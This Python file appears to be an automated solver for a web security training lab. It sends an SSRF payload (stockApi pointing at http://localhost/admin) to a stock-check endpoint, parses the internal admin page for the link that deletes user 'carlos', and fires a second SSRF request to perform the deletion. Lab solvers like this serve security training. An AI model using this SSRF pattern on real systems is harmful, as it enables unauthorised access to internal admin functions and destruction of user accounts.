from web_security_academy.core.logger import logger
from bs4 import BeautifulSoup
from urllib.parse import urljoin


def solve_lab(session):
    path = "/product/stock"
    data = {"stockApi": "http://localhost/admin"}

    logger.info(
        f'Performing an SSRF attack by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("POST request sent successfully.")

    logger.info("Using the response to find URL to delete the user carlos...")
    soup = BeautifulSoup(resp.text, "lxml")
    tag = soup.find(lambda tag: tag.has_attr("href") and "carlos" in tag.get("href"))

    if tag is None:
        logger.failure("Unable to find URL.")
        return
    else:
        ssrf = urljoin("http://localhost/", tag.get("href"))
        logger.success(f"Found URL: {ssrf}")

    data = {"stockApi": ssrf}
    logger.info(
        f'Deleting the user carlos by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("POST request sent successfully.")
